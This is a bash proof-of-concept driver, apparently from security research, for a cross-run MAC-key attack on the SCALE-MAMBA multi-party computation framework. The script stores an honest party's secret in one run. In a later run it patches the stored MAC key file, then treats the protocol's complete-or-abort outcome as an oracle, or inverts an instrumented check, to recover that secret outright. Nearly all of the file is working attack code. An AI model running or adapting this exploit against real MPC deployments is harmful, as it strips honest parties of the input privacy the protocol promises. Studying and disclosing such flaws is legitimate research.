#!/usr/bin/env bash
# Cross-run MAC-key-inconsistency PoC driver. Runs INSIDE the `scale` container
# (SCALE-MAMBA mounted at /scale), 2-party Full Threshold variant 18.
#
#   poc.sh store <y>            run 1: P0 inputs secret y, store in Ms[100],
#                               back up pristine Data/Memory-P* + MKey-1.key
#   poc.sh open baseline        run 2, no tampering            -> expect COMPLETE
#   poc.sh open mkeyonly        run 2, alpha_1 += 1 only       -> COMPLETE iff y==0
#   poc.sh open guess:<g>       run 2, alpha_1 += 1 and y.mac += g -> COMPLETE iff y==g
#   poc.sh recover [g]          run 2, alpha_1 += 1; attacker inverts the
#                               unmasked check to recover y outright (Sec 4.4)
#
# P1 always inputs x = 0 in run 2, so the revealed output is 0 regardless of y;
# the leak is purely COMPLETE vs ABORT (MAC check).
set -u
ROOT="${POC_ROOT:-/scale}"               # repo root inside the container
cd "$ROOT"
export USE_RUST=0
HERE="$(cd "$(dirname "$0")" && pwd)"     # where poc.sh + patcher.py live
PATCHER="$HERE/patcher.py"
BK="$HERE/bk"

# Offline mode. Default: FHE, the real Full Threshold preprocessing (slow, and
# slower still under x86 emulation). FAKE=1 switches to SCALE-MAMBA's built-in
# trusted-dealer "fake" offline: player 0 makes the triples/squares/bits/input
# masks in the clear and shares them, MAC'd under the real on-disk MAC keys, and
# no FHE threads are spawned (src/Player.cpp:506). Seconds per run instead of
# minutes. The attack is unchanged: FakePrep still reads Data/MKey-<i>.key
# (src/Offline/FakePrep.cpp:32-44) and the online MAC check is identical, so the
# cross-run key swap still works. It only bypasses the FHE path, so the default
# FHE run stays the canonical proof that FHE does not bind the key across runs.
# Implemented by flipping the trailing fake_offline/fake_sacrifice flags in
# Data/NetworkData.txt (parsed at src/System/SystemData.cpp:52-53).
apply_offline_mode() {
  local f="$ROOT/Data/NetworkData.txt" v=0
  [ "${FAKE:-0}" = 1 ] && v=1
  awk -v v="$v" '
    NR==2 { np=$1 }
    { L[NR]=$0; last=NR }
    END { f1=2+np+1; f2=2+np+2;
          for (i=1; i<=last; i++) print (i==f1 || i==f2) ? v : L[i] }' "$f" >"$f.tmp" && mv "$f.tmp" "$f"
  [ "${QUIET:-0}" = 1 ] || echo "  (offline mode: $([ "$v" = 1 ] && echo 'FAKE / trusted-dealer (fast)' || echo 'FHE (real)'))"
}
apply_offline_mode

run_players() {   # $1=prog $2=memflag $3=p0_input $4=p1_input [$5=P1 env prefix]
  pkill -9 -x PlayerBinary.x 2>/dev/null; sleep 1
  rm -f /tmp/poc_p0.log /tmp/poc_p1.log
  local p1env="${5:-}"     # e.g. "OFFKEY_RECOVER=1" -- set only on the attacker (P1)
  # Each party's own stdout/stderr already go to its log file, so the only thing
  # on this block's stderr is bash's job-control chatter ("Done"/"Aborted" for
  # the backgrounded pipelines, which is loud when a player aborts on mac_fail).
  # Discard it.
  {
    printf '%b' "$3" | stdbuf -oL -eL ./PlayerBinary.x 0 -m "$2" -f 1 "Programs/$1" >/tmp/poc_p0.log 2>&1 &
    local P0=$!
    printf '%b' "$4" | env $p1env stdbuf -oL -eL ./PlayerBinary.x 1 -m "$2" -f 1 "Programs/$1" >/tmp/poc_p1.log 2>&1 &
    local P1=$!
    wait $P0; RC0=$?
    wait $P1; RC1=$?
  } 2>/dev/null
}

report() {   # clean summary; returns 0 if the MAC check accepted, 1 if it rejected
  local z
  z=$(grep -hoE 'z = -?[0-9]+' /tmp/poc_p0.log /tmp/poc_p1.log 2>/dev/null | head -1 || true)
  [ -n "$z" ] && echo "  revealed output: $z   (independent of y; reveals nothing)"
  if [ "${RC0:-1}" = 0 ] && [ "${RC1:-1}" = 0 ]; then
    echo "  >>> MAC check ACCEPTED  ->  protocol COMPLETED"
    return 0
  fi
  echo "  >>> MAC check REJECTED (mac_fail)  ->  protocol ABORTED"
  return 1
}

cmd="${1:-}"; arg="${2:-}"
case "$cmd" in
  store)
    [ "${QUIET:-0}" = 1 ] || echo "== STORE: P0 secret y=$arg =="
    rm -f Data/Memory-P0 Data/Memory-P1
    run_players attack_store empty "$arg\n" ""
    if [ "${RC0:-1}" = 0 ] && [ "${RC1:-1}" = 0 ]; then
      echo "  stored (run 1 completed)"
    else
      echo "  store FAILED (run 1 did not complete)"; exit 1
    fi
    mkdir -p "$BK"; cp Data/Memory-P0 Data/Memory-P1 Data/MKey-1.key "$BK"/
    [ "${QUIET:-0}" = 1 ] || echo "  (pristine Memory-P* + MKey-1 backed up to $BK)"
    ;;
  open)
    [ "${QUIET:-0}" = 1 ] || echo "== OPEN ($arg) =="
    cp "$BK"/Memory-P0 Data/Memory-P0
    cp "$BK"/Memory-P1 Data/Memory-P1
    cp "$BK"/MKey-1.key Data/MKey-1.key
    pq=""; [ "${QUIET:-0}" = 1 ] && pq="--quiet"
    case "$arg" in
      baseline) [ "${QUIET:-0}" = 1 ] || echo "  [no patch]";;
      mkeyonly) python3 "$PATCHER" --data-dir "$ROOT/Data" --mkey-only $pq;;
      guess:*)  python3 "$PATCHER" --data-dir "$ROOT/Data" --guess "${arg#guess:}" $pq;;
      *) echo "unknown open mode: $arg"; exit 2;;
    esac
    run_players attack_open old "" "0\n"
    report; exit $?
    ;;
  recover)
    # Stronger attack: recover y outright from the unmasked check.
    # Only the MAC-key edit is needed (alpha_1 += 1); no guess. The attacker (P1)
    # runs with OFFKEY_RECOVER=1 so its own MAC check inverts the opened value.
    # arg is an optional guess offset g (default 0), passed via OFFKEY_GUESS.
    [ "${QUIET:-0}" = 1 ] || echo "== RECOVER (unmasked-check input recovery) =="
    cp "$BK"/Memory-P0 Data/Memory-P0
    cp "$BK"/Memory-P1 Data/Memory-P1
    cp "$BK"/MKey-1.key Data/MKey-1.key
    pq=""; [ "${QUIET:-0}" = 1 ] && pq="--quiet"
    python3 "$PATCHER" --data-dir "$ROOT/Data" --mkey-only $pq
    g="${arg:-0}"
    run_players attack_recover old "" "" "OFFKEY_RECOVER=1 OFFKEY_GUESS=$g"
    # The online program opens exactly one value (d = y - b), so the online
    # check is the unique "nopen=1" line. The FHE offline sacrifice phase also
    # opens (correctly keyed) values, but always in large batches, so filter to
    # nopen=1 and take the last such line (the online check runs after offline).
    rec=$(grep -a "OFFKEY_RECOVER " /tmp/poc_p1.log \
            | grep -a " nopen=1 " \
            | sed -n 's/.*recovered_y=\([0-9-]*\).*/\1/p' | tail -1)
    if [ -n "$rec" ]; then
      echo "  RECOVERED_Y=$rec"
    else
      echo "  (no recovery line; inspect /tmp/poc_p1.log)"
      exit 1
    fi
    ;;
  affine)
    # Example 2: private affine evaluation z = x*y + r, output masked by r.
    # Same tampering knobs as `open`. x and r are entered in run 2 (env AFF_X,
    # AFF_R), so both are authenticated under the restart key alpha+1. r is a
    # 64-bit uniform mask (SCALE-MAMBA's clear input path is 64-bit); the attack
    # is independent of r's distribution, so this suffices for the PoC.
    [ "${QUIET:-0}" = 1 ] || echo "== AFFINE ($arg)  x=${AFF_X:-1}  r=64-bit uniform mask =="
    cp "$BK"/Memory-P0 Data/Memory-P0
    cp "$BK"/Memory-P1 Data/Memory-P1
    cp "$BK"/MKey-1.key Data/MKey-1.key
    pq=""; [ "${QUIET:-0}" = 1 ] && pq="--quiet"
    case "$arg" in
      baseline) [ "${QUIET:-0}" = 1 ] || echo "  [no patch]";;
      mkeyonly) python3 "$PATCHER" --data-dir "$ROOT/Data" --mkey-only $pq;;
      guess:*)  python3 "$PATCHER" --data-dir "$ROOT/Data" --guess "${arg#guess:}" $pq;;
      *) echo "unknown affine mode: $arg"; exit 2;;
    esac
    # P0 (honest) enters r; P1 (attacker) enters x.
    run_players attack_affine old "${AFF_R:-7}\n" "${AFF_X:-1}\n"
    report; exit $?
    ;;
  affine-recover)
    # Example 2 with full input recovery: recover y outright from the unmasked
    # check while computing the masked affine output z = x*y + r. Like `recover`
    # but on the affine program; the standalone d = y - b opening (the last
    # nopen=1 check) is what the instrumentation inverts. arg is an optional guess
    # offset g (default 0), passed via OFFKEY_GUESS.
    [ "${QUIET:-0}" = 1 ] || echo "== AFFINE-RECOVER (unmasked-check input recovery)  x=${AFF_X:-1}  r=64-bit uniform mask =="
    cp "$BK"/Memory-P0 Data/Memory-P0
    cp "$BK"/Memory-P1 Data/Memory-P1
    cp "$BK"/MKey-1.key Data/MKey-1.key
    pq=""; [ "${QUIET:-0}" = 1 ] && pq="--quiet"
    python3 "$PATCHER" --data-dir "$ROOT/Data" --mkey-only $pq
    g="${arg:-0}"
    # P0 (honest) enters r; P1 (attacker) enters x and runs OFFKEY_RECOVER=1.
    run_players attack_affine_recover old "${AFF_R:-7}\n" "${AFF_X:-1}\n" "OFFKEY_RECOVER=1 OFFKEY_GUESS=$g"
    rec=$(grep -a "OFFKEY_RECOVER " /tmp/poc_p1.log \
            | grep -a " nopen=1 " \
            | sed -n 's/.*recovered_y=\([0-9-]*\).*/\1/p' | tail -1)
    if [ -n "$rec" ]; then
      echo "  RECOVERED_Y=$rec"
    else
      echo "  (no recovery line; inspect /tmp/poc_p1.log)"
      exit 1
    fi
    ;;
  *) echo "usage: poc.sh {store <y> | open <baseline|mkeyonly|guess:G> | recover [g] | affine <baseline|mkeyonly|guess:G> | affine-recover [g]}"; exit 2;;
esac
